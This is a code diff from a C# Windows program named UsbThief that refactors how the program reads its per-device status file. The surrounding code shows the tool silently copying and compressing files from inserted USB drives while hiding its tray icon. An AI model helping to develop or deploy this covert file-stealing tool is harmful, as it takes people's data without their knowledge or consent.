@@ -168,24 +168,10 @@ namespace UsbThief
             }
             if (conf.enable)
             {
-                try
+
+                Dictionary<string, string> devices = ReadSta();
+                if (devices != null)
                 {
-                    if (!File.Exists(Application.StartupPath + "\\status"))
-                    {
-                        FileStream fs1 = new FileStream(Application.StartupPath + "\\status", FileMode.Create, FileAccess.Write);
-                        fs1.Close();
-                    }
-                    Dictionary<string, string> devices = new Dictionary<string, string>();
-                    StreamReader sr = new StreamReader(Application.StartupPath + "\\status", Encoding.UTF8);
-                    string line;
-                    while ((line = sr.ReadLine()) != null)
-                    {
-                        string tmpSer = line.Split(':')[0];
-                        string status = line.Split(':')[1];
-                        if (!devices.ContainsKey(tmpSer))
-                            devices.Add(tmpSer, status);
-                    }
-                    sr.Close();
                     foreach (var item in devices)
                     {
                         if (item.Value == Status.copying.ToString() || item.Value == Status.compressing.ToString())
@@ -194,10 +180,6 @@ namespace UsbThief
                             compT.Start(item.Key);
                         }
                     }
-                }
-                catch (Exception)
-                {
-                    logger.Info("初始化状态文件失败");
                 }
             }
             else
@@ -301,7 +283,7 @@ namespace UsbThief
                                         if (drive.VolumeLabel != conf.volName)
                                         {
                                             string[] para = { currentDevice.ser, currentDevice.name, workspace + currentDevice.ser };
-                                            if (conf.delay != 0 && conf.delay <= 600)
+                                            if (conf.delay > 0 && conf.delay <= 600)
                                             {
                                                 notifyIcon1.Visible = false;
                                                 //HideRealMenu(true);
@@ -336,13 +318,14 @@ namespace UsbThief
                                             try
                                             {
                                                 //第二个bool指的是是否强制导出，如果之前导出过程中设备拔出导致状态停留在exporting，那么就强制导出
+                                                Dictionary<string, string> d = ReadSta();
                                                 Dictionary<string, bool> devices = new Dictionary<string, bool>();
-                                                StreamReader sr = new StreamReader(Application.StartupPath + "\\status", Encoding.UTF8);
-                                                string line;
-                                                while ((line = sr.ReadLine()) != null)
+                                                if (d == null)
+                                                    return;
+                                                foreach (var item in d)
                                                 {
-                                                    string tmpSer = line.Split(':')[0];
-                                                    string status = line.Split(':')[1];
+                                                    string tmpSer = item.Key;
+                                                    string status = item.Value;
                                                     if (status == Status.none.ToString() && !devices.ContainsKey(tmpSer))
                                                     {
                                                         devices.Add(tmpSer, false);
@@ -352,7 +335,6 @@ namespace UsbThief
                                                         devices.Add(tmpSer, true);
                                                     }
                                                 }
-                                                sr.Close();
                                                 string path = currentDevice.name + conf.exportPath;
                                                 if (!Directory.Exists(path))
                                                     Directory.CreateDirectory(path);
@@ -449,6 +431,36 @@ namespace UsbThief
                 logger.Error("发生异常：\n" + ex);
             }
             base.WndProc(ref m);
+        }
+        #endregion
+        #region 读状态文件
+        private Dictionary<string, string> ReadSta()
+        {
+            try
+            {
+                if (!File.Exists(Application.StartupPath + "\\status"))
+                {
+                    FileStream fs1 = new FileStream(Application.StartupPath + "\\status", FileMode.Create, FileAccess.Write);
+                    fs1.Close();
+                }
+                Dictionary<string, string> devices = new Dictionary<string, string>();
+                StreamReader sr = new StreamReader(Application.StartupPath + "\\status", Encoding.UTF8);
+                string line;
+                while ((line = sr.ReadLine()) != null)
+                {
+                    string tmpSer = line.Split(':')[0];
+                    string status = line.Split(':')[1];
+                    if (!devices.ContainsKey(tmpSer))
+                        devices.Add(tmpSer, status);
+                }
+                sr.Close();
+                return devices;
+            }
+            catch (Exception)
+            {
+                logger.Info("读取状态文件失败");
+                return null;
+            }
         }
         #endregion
         #region 写状态文件
